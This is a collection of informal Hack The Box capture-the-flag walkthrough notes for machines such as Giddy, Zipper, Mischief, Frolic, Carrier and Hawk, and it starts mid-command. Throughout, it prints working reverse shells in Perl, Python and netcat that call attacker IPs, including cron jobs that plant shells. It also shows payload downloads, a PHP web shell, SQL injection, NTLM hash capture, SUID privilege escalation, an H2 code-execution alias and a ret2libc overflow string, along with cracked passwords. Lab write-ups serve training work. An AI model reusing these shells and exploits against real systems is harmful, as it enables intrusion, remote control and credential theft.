+luZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwnPiZTJyk7b3BlbihTVERPVVQsJz4mUycpO29wZW4
+oU1RERVJSLCc%2FJlMnKTtleGVjKCcvYmluL3NoIC1pJyk7fTs%3D +|+base64+-
+d+%3E+/tmp/shell.pl" http://localhost/shell.php
+*************************************
+Before sending another curl command to execute this script, we need to get back to msfconsole
+(where we left with portfwd commands) and upload the socat binary (which is an advanced
+netcat ) for port fowarding the traffic from 172.19.0.4:3000 to our machine at
+10.10.14.76:3003 .
+meterpreter> cd /tmp
+meterpreter> upload socat
+meterpreter> shell
+bash -i
+# chmod +x socat
+# ./socat tcp-listen:5001,reuseaddr,fork tcp:10.10.15.100:3003
+We can setup a netcat listener in our machine at port 3003 and enter the following command to
+execute the shell.pl script:
+$ curl --data "cmd=perl+/tmp/shell.pl" http://localhost/shell.php
+This should spawn us a shell for the internal host:
+After enumerating, we see two users in the /home directory, where user.txt is located at
+/home/somaro , however only root is able to read that.
+so after 3 days being stucked finally got it:
+1st method:
+first we have to cp /bin/sh to cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b cuz thats the only dir that belong to us
+then we have to chmod 777 /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh
+then we have to chmod u+s /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh
+then we do rsync -p /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh root@backup::src/backup/
+finally we rsync and chmod with the SUID BIT SET with:
+rsync -p --chmod=+s root@backup::src/backup/sh /var/www/html/
+run it ./sh and we are root.
+ 
+2nd method:
+echo -n IyEvYmluL3NoCmNwIC9iaW4vc2ggL3RtcC9zaApjaG1vZCArcyAvdG1wL3No | base64 -d > root.rdb
+$ chmod +x root.rdb
+$ cat root.rdb
+#!/bin/sh
+cp /bin/sh /tmp/sh
+chmod +s /tmp/sh
+$ touch -- "-e sh root.rdb"
+ 
+Now we can upgrade to a meterpreter shell with elf method used before to upload a socat or nercat or wherever we need.
+ 
+11) Now we got root privs and now we can read the user flag
+12)now we read the crontab
+* * * * * root /tmp/nc 172.20.0.2 9001 -e /bin/sh
+13)now reading for clean file in cron.d on backup container we see we can upload our cronjob to it and get a reverse shell on backup container to do this we have to:
+now we have to upload a nc or ncat to www container box:
+once we upload everything we then
+ 
+create our cronjob with:  echo '* * * * * root /tmp/nc 172.20.0.3 7000' > myclean
+or use perl:
+ 
+1)* * * * * root perl -e 'use Socket;$i="172.20.0.3";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ 
+2)create a script with perl use the same code above for perl shell and upload to /tmp
+upload a cronjob to /etc/cron.d that execute that perl script like this:
+* * * * * root /bin/sh -c "perl /tmp/shell.pl"
+setup your ncat listening for incoming connections on www box.
+ 
+Once we have acces to backup box we must find the root flag doing a find -name root.txt
+ 
+we locate the root flag in  root.txt: backupfs/tmp/d/root/root.txt
+ 
+50d0db644c8d5ff5312ef3d17c2ed205
+ 
+********************************************
+ 
+HTB GIDDY
+1)Enumeration with zenmap show open ports 80,443,3389
+2)Going with browser to the machine ip shows us its a IIS server.
+3)Running dirbuster we found 2 interesting dirs
+/remote for powershell
+/cvm
+4)Running owasp-zap i managed to found to sqli injectable points the most important being http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1
+5)I try to inject but not response just errors
+6)Running sqlmap shows us its a mssql database
+7)So i can try to get a sql-shell with this command
+ 
+sqlmap -u 'http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1*" -│[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy                                    
+-dbms=mssql' --sql-shell
+ 
+Annnd we got a shell.
+7)doing some research we found this command
+EXEC master..xp_dirtree '\\10.10.15.43\dumbythegrey'
+to show us all the dirs and files from a remote machine, but we must find a way to intercept this data so we use Responder
+8)setting up responder with $responder -I tun0 -wrf and launching the above command we manage to intercept some critical info:****************************************
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.104
+[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy
+[SMBv2] NTLMv2-SSP Hash     : Stacy::GIDDY:b1878626a82d72fa:5B8D62AF69AB5797FEBC42777BDBE880:0101000000000000C0653150DE09D2018EF95EAB42F055BB000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000017190205C39113DFCE10FD89661C8AAC982FB5755698C1A119AA5744811E38080A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E0034003300000000000000000000000000
+[*] Skipping previously captured hash for GIDDY\Stacy
+[*] Skipping previously captured hash for GIDDY\Stacy
+[*] Skipping previously captured hash for GIDDY\Stacy
+**************************************************
+9) now lets crack that hash
+ 
+cmd.exe /c 'C:\Users\Stacy\launcher.bat'
+ 
+using hashcat -m 54000 file.hash rockyou.txt we found the password is:
+ 
+xNnWo6272k7x
+ 
+10)So with this credentials we can go to /remote and try it
+on first attemp with creds its shows us some shells running but instantly logged out
+11)trying again seems to got an error
+12)After so much strugging i found to login with a the creds into a powershell we must provide the full path user
+ 
+MACHINE\User   so its GIDDY\Stacy
+13)And we managed to login and grab the user flag
+14)now into priv scalation
+15)Running basic enumeration for win machines was able to found not so much
+16)Then in stacy Documents Folder we found an app called Unify-video
+17)we search online and found a vulnerability priv esc for this specific app
+the vulnerability https://www.exploit-db.com/exploits/43390/
+*****The ProgramData folder its a dir located in C:\ but its hidden*****
+18)So we create a bat file with our payload:
+echo @off
+C:\Users\Stacy\Documents\nc -e cmd 10.10.15.43 4949
+19)Now we have to convert this bat to an exe file so i found a site online that does that and download the exe file
+20)upload netcat and taskkill.exe with wget or iwr command like this:
+wget http://10.10.12.197:80/nc.exe -UseBasicParsing -OutFile nc.exe
+wget http://10.10.12.197:80/taskkill.exe -UseBasicParsing -OutFile taskkill.exe
+21)now move your taskkill.exe file to the app data folder located in C:\ProgramData\unifi-video
+22)start your nc listener locally
+23)go to that dir and start and stop the unifi-video service like this:
+start-service "Ubiquiti UniFi Video"
+stop-service "Ubiquiti UniFi Video"; ps;   ## notice we append the ps command for a powershell process
+24)And we got a reverse nc shell with authority-system privileges
+25)Grab your root flag  : >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> CF559C6C121F683BF3E56891E80641B1
+ 
+*************************************************
+ 
+HTB ZIPPER
+1)Nmap shows open port 80 and 22
+2)navigating to 80 show default apache server
+3)Running dirb with a custom wordlist for webapps we found /zabbix login page
+4)we login as guest and try to find something,
+we found zabbix was changed to zapper so we can try as login and bingo!!
+5)user its unable to login dashboard so we must find another way.
+6)Doing so much thing i managed to get the api json zabbix its using /jsrpc.php
+7)So i create a script with python to manage to connect to api and make requests
+8)I make a request to create a new user with super admin privileges and we login to the dashboard
+create a script for zabbix administrator a reverse shell with perl:
+perl -e 'use Socket;$i="10.10.15.166";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+9)The execute script must execute on zabbix agent not on server cuz server its a docker container(rabbit hole)
+10)server id to execute script its 10106
+11)we managed to get a reverse shell but cant read files.
+found a passwd ZippityDoDah
+12)now get a reverse shell for zabbix agent and once login spawn a tty shell with
+python3 -c 'import pty; pty.spawn("/bin/sh")''
+13)grab the user flag
+14)copy the ssh key for a stable shell
+15)looking for basic privilege scalation an enumeration.
+we see theres a binary with root privileges that SUID enabled
+running strings zabbix-service
+we see its running systemctl as root so we can do that
+to remove unwanted symbolic links   :   find -name l -delete
+so first:
+1) exporth PATH=.
+2) /bin/echo '/bin/sh -i' >> systemctl
+3) /bin/chmod +x systemctl
+4) ./zabbix-service ... start
+5) read the root flag  >>>>>>>>>>>>>>>>>>>>>  a7c743d35b8efbedfd9336492a8eab6e
+ 
+*****************************************
+ 
+HTB MISCHIEF
+1)Enumeration shows open port 22, 3366 and upd 161 running snmp
+2)So we do snmpwalk -v 1 -c 10.10.10.92 and throws a bunch of info
+3)searching for good info i found on snmp log a user and a password:   loki:godofmischiefisloki running on a SimpleHTTPAuthServer.
+4)then going to 10.10.10.92:3366 ask for user and password so we provide the credentials we found and login
+5)There some new credentials in here loki:trickeryanddeceit
+6)we found an image
+7)image its rabitt hole
+8)from nmap full scan we notice some more ports and from snmpwalk we notice apache and mysql its running but not showing up so it mus be ipv6.
+9)so we download an ipv6 ennumeration tool like enyx for snmp run it and shows ipv6 address: [dead:beef::250:56ff:feb9:a728]
+10)remember ipv6 adress changes every reboot
+11) now we use it in browser and another login page tried all creds with user we got so far but theyre not working.
+12) keep enummerating
+13)tried all basic users standar users, none seems to work after i remember another standard user administrator -.- that worked with second password.
+14)we managed to login to the Command Execution Panel and try a few commands and looks that theyre not working.
+15)In fact they work but as we see in snmpwalk enumeration all the output its being send to /dev/null so we must find a way to redirect it to us.
+16)So we must run our command like this: cat /home/loki/* &> STDOUT  ||->>>>>>>>>
+       so in shorter explaination we redirect the output to the standard or STDOUT and we cat /home/loki/*  (all) because
+       while i was trying to read the contents it doesnt work if i just typed /home/loki/credentials so we cat all and
+       redirect it to stdout!
+and got ssh passwd   lokiisthebestnorsegod
+17)Privilege Scalation
+18)Searching in lokis home im not being able to find anything also loki's user cannot run sudo or su so we must find a way to get to another user.
+ 
+The user we use to get the loki's password it was www-data user so we execute a reverse ipv6 shell from command console on ipv6 browser with:
+ 
+notice we have to use our ipv6 local address
+ 
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1384",4444,0,3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+ 
+Alternatively we can run the same python reverse shell with loki user
+but before the command we must append
+$ systemd-run (python command) **but without the scope value "0,3"**
+ 
+with the loki shell we can place the same python script in a /tmp/ fle and then
+make a crontab into the RCE form to execute it as www-data
+loki@Mischief:~$ cat /tmp/shell.sh
+#!/bin/bash
+python -c 'import
+socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1068",2222));os.dup2(s.fleno(),0);
+os.dup2(s.fleno(),1); os.dup2(s.fleno(),2);p=pty.spawn("/bin/sh");'
+ping -c 2 127.0.0.1&&(crontab -l 2>/dev/null; echo "*/1 * * * *
+/tmp/shell") | crontab - ;
+wait a minute and usllget the reverse shell
+ 
+and got ourselves a shell for www-data and it can execute sudo or su.
+19)we must find www-data su password and we found in loki's .bash_history in the python part:  
+ 
+lokipasswordmischieftrickery
+ 
+we gain root access but the flag isnt located here, get a shell it says.
+ 
+20)But we are in a root shell we dont need anything more so we search for another root.txt file with command
+ 
+find -name root.*
+ 
+and the flag its stored in usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+ 
+so we navigate to that dir and cat root.txt with its content:
+ 
+ae155fad479c56f912c65d7be4487807
+ 
+************************************************
+ 
+HTB FROLIC
+ 
+1) As always enum
+2) visit 2 sites and dirbuster in diferent ports 9999 and 1880 open 22 open 139 and 445
+3) found 2 sites on 9999 site : /backup and /admin login to admin are in source code and js script
+4) admin login shows a weird code
+5) backup page show user and pass txt admin:imnothuman
+6)the weird code its formated in Ook go to decode.fr and decode it
+7)the decoded Ook strings points to a dir /asdiSIAJJ0QWE9JAS/
+8)dir contains encoded zip to decode and download go to freeformater
+9)crack zip file with fcrackzip -v -u -D -p /usr/share/dic/words
+10) password
+11)found index.php with another coded
+12) decoded first hex to ascii to base64 to brainfuck and get the password "idkwhatispass"
+13)found dir with gobuster and medium dic for playsms
+14)get a meterpreter session with
+exploit/multi/http/playsms_uploadcsv_exec user and pass you got
+15)get the user flag
+16)ldd rop to know the lib adrres its using
+17)export PATH=/usr/lib/gcc/i686-linux-gnu/5:/sbin:/bin:/usr/sbin:/usr/bin
+18)start searching for system, execve, exit and /bin/sh adresss
+19)upload the script libc-search.c
+20)compile it like this gcc libc-search.c -o libc-search -lc -ldl and run
+21)search -s system then -s exit then -s execve
+22)search -p /bin/sh -b "libcstring"  --------> 0xb7e190003
+23)begin to make our exploit with python
+The exit address is: 0xb7e479d0
+The system address is: 0xb7e53da0
+The execve address is: 0xb7ec97e0
+The /bin/sh address is: 0xb7f74a0b
+cat /proc/$$/maps | grep stack bffdf000-c0000000 rw-p 00000000 00:00 0 [stack]
+ 
+## stack address begins wiht \x00 so we changed to \xe0
+ 
+exit() -> "\xd0\x79\xe4\xb7"; system() -> "\xa0\x3d\xe5\xb7"; execve() -> "\xe0\x97\xec\xb7"
+stack is \xe0\xf0\xfd\xbf
+so buffer at 48, dummy at 4, execve pointer, exit pointer, /bin/sh pointer, and stack pointer which acts as system
+ 
+so exploit its
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>    
+python -c 'print "A"*48+"B"*4+"\xe0\x97\xec\xb7"+"\xc8\x97\xec\xb7"+"\x0b\x4a\xf7\xb7"+"\xe0\xf0\xfd\xbf"+"\xe0\xf0\xfd\xbf"'
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+24)run ./rop $(exploit)
+25)cat root flag   85d3fdf03f969892538ba9a731826222
+ 
+**********************************************
+ 
+HTB CARRIER
+1)Do a full port scan TCP and UDP
+2)Found login page whic contains some codes about errors saying password its the chassis number
+3)got port 161 running snmp
+4)use snmpwalk -v 1 -c public 10.10.10.105
+5) got the number SN#NET_45JDX23
+6)Login with user admin and the pass
+Notice the tickets area with useful info normally unresolved issues are vulns.
+7)Notice the diagnostics verify status
+8)capture the request with burp and notice check= parameter it ask for ps aux | grep quagga
+9)the commands must be encoded in base 64 to work
+9)so we can chain another command to it like nc but /bin/sh its giving us problems so we specify /bin/bash
+quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.x.x 4444 >/tmp/f
+in base64 encoded:
+cXVhZ2dhOyBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vYmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzNCA0NDQ0ID4vdG1wL2Y=0)
+10)get user flag
+Previusly with gobuster we manage to find a diagram with the servers that linked with quagga.
+11) find the routes and from hint in login pages tickets we get:
+"one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network", and after flushing the iptables rules and just doing a ping sweep I found 10.120.15.1 and 10.120.15.10.encoded in base 64:
+ 
+12)10.120.15.10 has an FTP server, .1 does not. So I'm pretty sure 10.120.15.10 is the FTP server.
+ 
+I also tried injecting a network in bgpd.conf, namely:
+ 
+"network 10.120.15.0/21"
+ 
+Then systemctrl restart quagga.
+ 
+I then tried to sniff with tcpdump on eth1.
+ 
+Why eth1? Because from the diagram (diagram_for_tac.png) and a lot of network enumeration it seems:
+We cab upload a nmap binary to scan for network in local.
+The box you get a shell on is AS100.
+The "important FTP server" is connected to AS300.
+AS100 is connected to both AS200 and AS300.
+Connections to the FTP server are probably originating from AS200. To reach 10.120.15.10 it need to go through AS300, we want it to go through us instead by claiming we have this prefix connected to us even when we don't.
+ 
+We receive traffic from AS200 on eth1, so eth1 it is.
+ 
+I didn't get anything though.
+ 
+But this would be just a prefix hijack, the ASPATH is just as long both going through us (AS100) as through AS300. Hence a subprefix hijack attack is needed, I think?
+ 
+In a subprefix hijack we need to announce a new prefix, i.e. a longer prefix, from what I understand from doing some reading. That means ... a more specific subnet?
+ 
+the FTP server is at 10.120.15.10, you need to configure eth2 up as that IP, and you need to inject a network with a long prefix, such as 10.120.15.8/29 into the bgpd.conf, .8 because the subnetmask only allows for a few hosts, and we want it to overlap with .10.
+ 
+Try that, and be aware of that pesky script under /opt which resets the whole thing, I just gave it a .bak extension to prevent the thing from running.
+ 
+Then you should start getting FTP traffic.
+ 
+so I set the eth2 adapter to 10.120.15.10 netmask 255.255.255.0 and added network 10.120.15.8/29 to the bgpd.conf file and changed the restore.sh to restore.sh.bak
+restart the quagga service
+Then start up nc and bind it to that IP and listen for incoming FTP:
+Alternate we can use ftpd.py and upload to the machine.
+when it connects throw a 220 FTP response and then a 331 FTP response and it will get you the root credentials for you to ssh.
+13)credentials are:
+                        root:BGPtelc0rout1ng
+ 
+14)now login through ssh with new credentials ----->>> ssh root@10.10.10.105
+15)get root flag and secret
+Root flag: 2832e552061532250ac2a21478fd4866
+ 
+*********************************************
+ 
+HTB SECNOTES
+1)Enumeration with nmap discovering open ports full tcp scan all ports
+2)enter web page and create a user with a sqli query ' OR '1'='1
+3)search in the notes for user and pass  :  92g!mA8BGjOirkL%OG*&
+4)login with smbclient and upload a shell like this:
+       
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+ 
+5)Using nc.exe establish a reverse connection to attacker machine wiht nc -nv 10.10.xx.xx 4444 -e cmd.exe
+6)notice the weird distro folder containig ubuntu so we must find bash.exe running dir bash.exe /s /p
+7)run bash.exe and search for the past and login with smbclient with credentials:
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$
+8)GET the root.txt flag
+ 
+***********************************************
+ 
+HTB YPUFFY
+1) Enum ldap and find the hashes for alice user
+2) use the hashes with smb login
+3) get the ssh key and login trough ssh
+4) read the doas.conf httpd.conf and sshd_config
+5) try to enumerate users and principals with curl with command /usr/local/bin/curl -i 'http://127.0.0.1/sshauth?type=principals&username=root'
+6)go to /tmp and generate a ssh id_rsa key for alice
+7)generate certificate for principal with id_rsa private key generated with command
+doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I alice1978 -n 3m3rgencyB4ckd00r id_rsa
+8)login with ssh to root@localhost with private key
+9)flag
+ 
+***********************************************
+ 
+HTB Bounty
+1)Enumerate and find .aspx files
+2)find upload webapp and use format web.config with correct payload
+3)upload payload and use your RCE
+4)powershell download files thorugh webshell
+ - powershell $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://10.10.15.x/payload.exe','C:\netpub\wwwroot\UploadedFiles\payload.exe')
+ - powershell \path\to\payload
+5)run payload with powershell
+6)multi handler meterpreter
+7)migrate to x64 shell
+You can do this by running the following commands after you already have a 32 bit Meterpreter shell: use windows/local/payload_inject
+set payload windows/x64/meterpreter/reverse_tcp
+or looking for proccess that are already running in x64 and migrate to it
+8)run post explotation module and exploit(root)
+ 
+******************************************************
+ 
+HTB WALDO
+ 
+1) Usando burp suite se encuentra la ruta en la cual se puede hacer el directory transversal desde este se encuentra la vulnerabilidad y notamos que existe un filtro el cual se puede evadir usando ./ para ir al primer directorio y luego ....//(para saltar el filtro).
+2) Al encontrar la llave ssh del usuario nobody esta se debe formatear y se deben borrar todos los caracteres "\n"asi como "\"y se formatea en https://www.samltool.com/format_privatekey.php.
+ 
+3) logearse por ssh con el usuario nobody
+ 
+4)login again with the same ssh key from remote machine as monitor to localhost with args -t bash -norc" without quotes to break the default bash login
+ 
+5)run "/usr/bin/tac /root/root.txt
+ 
+***************************************************
+ 
+HTB HAWK
+ 
+1)As usual enum nmap shows port 80, 21 , 22, 8082 ---> runing H2 DATABASE
+2)web page show login, register and few rabbit holes
+3)dirb shows a bunch of dirs and files none of those seems to help
+4)login through ftp on port 21 with user anonymous found a dir with a encrypted file on it
+5)using file + name of the encrypt file shows "openssl enc'd data with salted password, base64 encoded"
+6)research for a tool to do de decrypt procces and found https://github.com/deltaclock/go-openssl-bruteforce
+7)Download and bruteforce with ./openssl-brute -file /path
+8)decrypted file shows:
+Daniel,
+ 
+Following the password for the portal:
+ 
+PencilKeyboardScanner123
+ 
+Please let us know when the portal is ready.
+ 
+Kind Regards,
+ 
+IT department
+ 
+9)The credentials they sad are mean user daniel but for work in portal he needs to be admin so the user admin and password in the mail.
+10)login and search for modules and enable php filter save config and go to content>> article >> new article
+11) in name any name in content of the article paste your shell ill use p0wny shell.
+12)grab user flag
+13)enumerating for config files i was able to locate /var/www/html/sites/default/settings.php where it its stored the user and password for database which is drupal:drupal4hawk and trying it with daniel i managed to login through ssh.
+14)enumeration with enum4lin i was able to realize the service for h2 console when we acces through browser its says it only allows local connections to the service so we have to create a ssh tunnel to it:
+ 
+└──╼ #ssh -D 1080 -L6801:127.0.0.1:7082 -L6802:127.0.0.1:8082 daniel@10.10.10.102
+another way of ssh tunneling is:
+daniel@hawk:~$
+daniel@hawk:~$ <---here i type ~C ssh> -D 8082
+Forwarding port.
+ 
+then we can verify im listenning on this port on local machine:
+ 
+netstat -anlp | grep 8082
+tcp 0 0 127.0.0.1:8082 0.0.0.0:* LISTEN 3445/ssh
+tcp6 0 0 ::1:8082 :::* LISTEN 3445/ssh
+ 
+once we create the tunnel just access with 127.0.0.1:6802 for tunneling method 1 or 127.0.0.1:8082 for method 2 through browser .
+ 
+15)once we access we found by trial and error that database its test no ˜test and user was "sa" and password was the same "sa" so i login in and voila!
+ 
+16) once we got the H2 console so we can execute java code for creating an ALIAS and run
+ 
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;
+ 
+then just CALL SHELLEXEC('cat root.txt')
+ 
+Another viable way its using 44422.py exploit from exploit.db with python3, python2 cause problems.
+ 
+with this command
+└──╼ #python3 44422.py -H 127.0.0.1:6802 -d jdbc:h2:tcp://10.10.10.102/~/drupal
+ 
+where the -d argument its the host where the database its allocated look we dont need any user and password just the exploit as it its with the correct database path -d jdbc:h2:tcp://10.10.10.102/~/drupal.
+54f3e840fe5564b42a8320fd2b608ba0
+DONE!!
